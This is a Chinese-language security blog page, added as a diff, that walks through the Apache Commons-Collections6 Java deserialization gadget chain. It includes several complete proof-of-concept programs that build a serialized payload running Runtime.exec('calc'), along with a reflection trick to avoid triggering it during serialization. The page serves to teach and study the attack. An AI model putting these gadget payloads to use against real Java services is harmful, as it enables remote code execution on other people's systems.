@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>Commons-Collections6 | he11的农场</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://dydydy123.github.io/favicon.ico?v=1686555449410">
+<link rel="stylesheet" href="https://dydydy123.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="Commons-Collections6是在Commons-Collections1的LazyMap链基础上进行了改进，解决了Commons-Collections1在Java 8u71以后因为sun.reflect.annotation...." />
+    <meta name="keywords" content="cc,java,反序列化" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://dydydy123.github.io">
+        <img src="https://dydydy123.github.io/images/avatar.png?v=1686555449410" class="site-logo">
+        <h1 class="site-title">he11的农场</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="https://dydydy123.github.io/post/you-lian" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      ganma~~~~~~~~~~
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://dydydy123.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">Commons-Collections6</h2>
+            <div class="post-date">2022-11-14</div>
+            
+              <div class="feature-container" style="background-image: url('https://dydydy123.github.io/post-images/n.jpg')">
+              </div>
+            
+            <div class="post-content" v-pre>
+              <p>Commons-Collections6是在Commons-Collections1的<code>LazyMap链</code>基础上进行了改进，解决了Commons-Collections1在Java 8u71以后因为<code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code> 的逻辑发生变化，而无法利用的问题。</p>
+<!-- more -->
+<p><strong>Commons-Collections6调用链示意图</strong><br>
+<img src="https://dydydy123.github.io/post-images/1668511270738.png" alt="" loading="lazy"></p>
+<p>首先我们来到<code>LazyMap.get()</code>这步，在这步之后的所以操作均与之前Commons-Collections1的<code>LazyMap链</code>相同。</p>
+<p><strong>到该步的代码为：</strong></p>
+<pre><code>package Cc6;
+
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+import org.apache.commons.collections.map.TransformedMap;
+
+import java.io.*;
+import java.lang.annotation.Target;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Method;
+import java.lang.reflect.Proxy;
+import java.util.HashMap;
+import java.util.Map;
+
+public class Cc6 {
+    public static void main(String[] args) throws Exception {
+        Transformer[] transformers = {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class,Class[].class}, new Object[]{&quot;getRuntime&quot;,null}),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class,Object[].class}, new Object[]{null,null}),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc&quot;}),
+        };
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+        Map&lt;Object,Object&gt; map = new HashMap&lt;&gt;();
+
+        Map lazyMap = LazyMap.decorate(map,chainedTransformer);
+
+    }
+    public static void serialize(Object obj) throws IOException {
+        ObjectOutputStream o = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        o.writeObject(obj);
+    }
+    public static Object unserialize(String s) throws IOException, ClassNotFoundException {
+        ObjectInputStream o = new ObjectInputStream(new FileInputStream(s));
+        return o.readObject();
+    }
+}
+
+</code></pre>
+<p>接下来我们要去寻找何处调用了，<code>get()</code>。在<code>TiedMapEntry</code>的<code>getValue()</code>方法中调用了<code>get()</code>方法。</p>
+<p><strong>TiedMapEntry#getValue</strong></p>
+<pre><code>public Object getValue() {
+        return map.get(key);
+    }
+</code></pre>
+<p>且map可控。为构造时我们传入的map（此处为<code>LazyMap</code>）。</p>
+<p><strong>TiedMapEntry#TiedMapEntry</strong></p>
+<pre><code>public TiedMapEntry(Map map, Object key) {
+        super();
+        this.map = map;
+        this.key = key;
+    }
+</code></pre>
+<p>然后查找何处调用了<code>getValue()</code>,在<code>TiedMapEntry</code>的<code>hashCode()</code>中调用了<code>getValue()</code></p>
+<p><strong>TiedMapEntry#hashCode</strong></p>
+<pre><code>public int hashCode() {
+        Object value = getValue();
+        return (getKey() == null ? 0 : getKey().hashCode()) ^
+               (value == null ? 0 : value.hashCode()); 
+    }
+</code></pre>
+<p>继续向上查找什么地方调用了<code>hashCode()</code>，然后我们想起在<code>URLDNS链</code>中使用的入口类<code>HashMap</code>该类存在调用hashCode()方法的地方。在<code>HashMap#hash()</code>方法中调用了<code>hashCode()</code>。</p>
+<p><strong>HashMap#hash()</strong></p>
+<pre><code>static final int hash(Object key) {
+        int h;
+        return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);
+    }
+</code></pre>
+<p>只需要控制此处的<code>key</code>为<code>tiedMapEntry</code>(我们前面构造的<code>TiedMapEntry</code>类)即可调用到<code>TiedMapEntry#hashCode</code>。</p>
+<p>在<code>HashMap#readObject()</code>中调用了<code>hash()</code>。<br>
+而在<code>HashMap#put</code>中也调用了<code>hash()</code>，这将引出一个问题。</p>
+<p><strong>HashMap#readObject</strong></p>
+<pre><code>private void readObject(java.io.ObjectInputStream s)
+        throws IOException, ClassNotFoundException {
+        // Read in the threshold (ignored), loadfactor, and any hidden stuff
+        s.defaultReadObject();
+        reinitialize();
+        if (loadFactor &lt;= 0 || Float.isNaN(loadFactor))
+            throw new InvalidObjectException(&quot;Illegal load factor: &quot; +
+                                             loadFactor);
+        s.readInt();                // Read and ignore number of buckets
+        int mappings = s.readInt(); // Read number of mappings (size)
+        if (mappings &lt; 0)
+            throw new InvalidObjectException(&quot;Illegal mappings count: &quot; +
+                                             mappings);
+        else if (mappings &gt; 0) { // (if zero, use defaults)
+            // Size the table using given load factor only if within
+            // range of 0.25...4.0
+            float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);
+            float fc = (float)mappings / lf + 1.0f;
+            int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?
+                       DEFAULT_INITIAL_CAPACITY :
+                       (fc &gt;= MAXIMUM_CAPACITY) ?
+                       MAXIMUM_CAPACITY :
+                       tableSizeFor((int)fc));
+            float ft = (float)cap * lf;
+            threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?
+                         (int)ft : Integer.MAX_VALUE);
+            @SuppressWarnings({&quot;rawtypes&quot;,&quot;unchecked&quot;})
+                Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap];
+            table = tab;
+
+            // Read the keys and values, and put the mappings in the HashMap
+            for (int i = 0; i &lt; mappings; i++) {
+                @SuppressWarnings(&quot;unchecked&quot;)
+                    K key = (K) s.readObject();
+                @SuppressWarnings(&quot;unchecked&quot;)
+                    V value = (V) s.readObject();
+                putVal(hash(key), key, value, false, false);
+            }
+        }
+    }
+</code></pre>
+<p><strong>HashMap#put</strong></p>
+<pre><code>public V put(K key, V value) {
+        return putVal(hash(key), key, value, false, true);
+    }
+</code></pre>
+<p><strong>但是在此处存在有问题。</strong></p>
+<pre><code>package Cc6;
+
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+import org.apache.commons.collections.map.TransformedMap;
+
+import java.io.*;
+import java.lang.annotation.Target;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Method;
+import java.lang.reflect.Proxy;
+import java.util.HashMap;
+import java.util.Map;
+
+public class Cc6 {
+    public static void main(String[] args) throws Exception {
+        Transformer[] transformers = {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class,Class[].class}, new Object[]{&quot;getRuntime&quot;,null}),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class,Object[].class}, new Object[]{null,null}),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc&quot;}),
+        };
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+        Map&lt;Object,Object&gt; map = new HashMap&lt;&gt;();
+
+        Map lazyMap = LazyMap.decorate(map,chainedTransformer);
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;key&quot;);
+
+        HashMap&lt;Object, Object&gt; map2 = new HashMap&lt;&gt;();
+        //HashMap只能通过put赋值
+        map2.put(tiedMapEntry,&quot;1&quot;);
+        serialize(map2);
+//        unserialize(&quot;ser.bin&quot;);
+    }
+    public static void serialize(Object obj) throws IOException {
+        ObjectOutputStream o = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        o.writeObject(obj);
+    }
+    public static Object unserialize(String s) throws IOException, ClassNotFoundException {
+        ObjectInputStream o = new ObjectInputStream(new FileInputStream(s));
+        return o.readObject();
+    }
+}
+
+</code></pre>
+<p><img src="https://dydydy123.github.io/post-images/1668517980001.png" alt="" loading="lazy"><br>
+在序列化时便弹出了计算器，原因是因为在<code>put()</code>的时候便调用了<code>hashCode()</code>从而调用了后面的利用链弹出了计算器。</p>
+<p><strong>解决方法</strong><br>
+我们可以先改掉Transformer数组的值，使调用链中断，再在序列化之前利用反射将之改为正常的值。</p>
+<pre><code>package Cc6;
+
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+
+import java.io.*;
+import java.lang.reflect.*;
+import java.util.HashMap;
+import java.util.Map;
+
+public class Cc6 {
+    public static void main(String[] args) throws Exception {
+//构造一个序列化时无用的facktransformers对象
+        Transformer[] facktransformers = {new ConstantTransformer(1),};
+
+        Transformer[] transformers = {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class,Class[].class}, new Object[]{&quot;getRuntime&quot;,null}),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class,Object[].class}, new Object[]{null,null}),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc&quot;}),
+        };
+        System.out.println(transformers);
+
+        ChainedTransformer chainedTransformer = new ChainedTransformer(facktransformers);
+
+        Map map = new HashMap&lt;&gt;();
+
+        Map lazyMap = LazyMap.decorate(map,chainedTransformer);
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;key1&quot;);
+
+        Map map2 = new HashMap&lt;&gt;();
+        //HashMap只能通过put赋值
+        map2.put(tiedMapEntry,&quot;1&quot;);
+        //map.clear();
+
+        //利用反射使 ChainedTransformer 中的 iTransformers字段变为 transformers对象;
+        Field field = chainedTransformer.getClass().getDeclaredField(&quot;iTransformers&quot;);
+        field.setAccessible(true);
+        field.set(chainedTransformer,transformers);
+
+        System.out.println(field.get(chainedTransformer));
+        serialize(map2);
+        unserialize(&quot;ser.bin&quot;);
+    }
+    public static void serialize(Object obj) throws IOException {
+        ObjectOutputStream o = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        o.writeObject(obj);
+    }
+    public static Object unserialize(String s) throws IOException, ClassNotFoundException {
+        ObjectInputStream o = new ObjectInputStream(new FileInputStream(s));
+        return o.readObject();
+    }
+}
+
+</code></pre>
+<p>更改过后序列化时并未弹出计算器，但是反序列化时也未弹出计算器。原因在于序列化时put()函数会对我们LazyMap中传入的map赋值，使map的key为key，在序列化时</p>
+<p>在put()处下个断点调试一下：</p>
+<p><strong>HashMap#put</strong><br>
+首先进入<code>put()</code>函数此处key为传入的<code>tiedMapEntry</code>，然后进入<code>hash()</code>。</p>
+<pre><code>public V put(K key, V value) {
+        return putVal(hash(key), key, value, false, true);
+    }
+</code></pre>
+<p><strong>HashMap#hash</strong><br>
+key为<code>tiedMapEntry</code>，然后进入<code>TiedMapEntry#hash</code></p>
+<pre><code>static final int hash(Object key) {
+        int h;
+        return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);
+    }
+</code></pre>
+<p><strong>TiedMapEntry#hashCode</strong><br>
+然后进入<code>TiedMapEntry#getValue</code></p>
+<pre><code> public int hashCode() {
+        Object value = getValue();
+        return (getKey() == null ? 0 : getKey().hashCode()) ^
+               (value == null ? 0 : value.hashCode()); 
+    }
+</code></pre>
+<p><strong>TiedMapEntry#getValue</strong><br>
+此处map为构造<code>tiedMapEntry对象</code>时传入的<code>lazyMap</code>（<code>TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;key1&quot;);</code>），然后跟进到<code>LazyMap#getValue</code>。此处key为构造时传入的<code>&quot;key1&quot;</code></p>
+<pre><code>public Object getValue() {
+        return map.get(key);
+    }
+</code></pre>
+<p><strong>LazyMap#getValue</strong><br>
+此处map为构造<code>lazyMap对象</code>时传入的<code>map</code>（<code>Map lazyMap = LazyMap.decorate(map,chainedTransformer);</code>），在if中对先判断<code>new TiedMapEntry(lazyMap, &quot;key1&quot;)</code>时传入的<code>“key1”</code>在不在此处<code>map</code>中，如果不在才进入if。而我们<code>put()</code>时<code>“key1”</code>确实不在<code>map</code>中但是当<code>put</code>后进入此处if时却对当前<code>map</code>进行了<code>put</code>将“key1”添加到了<code>map</code>中，然后反序列化进行到此处时<code>“key1”</code>已经在<code>map</code>中了。使用我们没有弹出计算器。</p>
+<pre><code>public Object get(Object key) {
+        // create value for key if key is not currently in the map
+        if (map.containsKey(key) == false) {
+            Object value = factory.transform(key);
+            map.put(key, value);
+            return value;
+        }
+        return map.get(key);
+    }
+</code></pre>
+<p>解决方法便是在<code>map2.put(tiedMapEntry,&quot;1&quot;);</code>后将<code>LazyMap.decorate(map,chainedTransformer);</code>中的<code>map</code>清空或者将它的<code>“key1”</code>键移除。<br>
+<code>map.clear()</code>或<code>map.remove(&quot;key1&quot;)</code>。<br>
+<img src="https://dydydy123.github.io/post-images/1668522432412.png" alt="" loading="lazy"></p>
+<p>最后再来看看ysoserial的实现，发现与我们的略有不同。<br>
+ysoserial中，是利用 java.util.HashSet#readObject 到 HashMap#put() 到 HashMap#hash(key)最后到 TiedMapEntry#hashCode()<br>
+<img src="https://dydydy123.github.io/post-images/1668522860287.png" alt="" loading="lazy"></p>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://dydydy123.github.io/tag/H2OnWZra8/" class="tag">
+                    cc
+                  </a>
+                
+                  <a href="https://dydydy123.github.io/tag/-DwzpURo7/" class="tag">
+                    java
+                  </a>
+                
+                  <a href="https://dydydy123.github.io/tag/OtQMAvCGr3/" class="tag">
+                    反序列化
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://dydydy123.github.io/post/commons-collections1/">
+                  <h3 class="post-title">
+                    Commons-Collections1
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+
+  </body>
+</html>
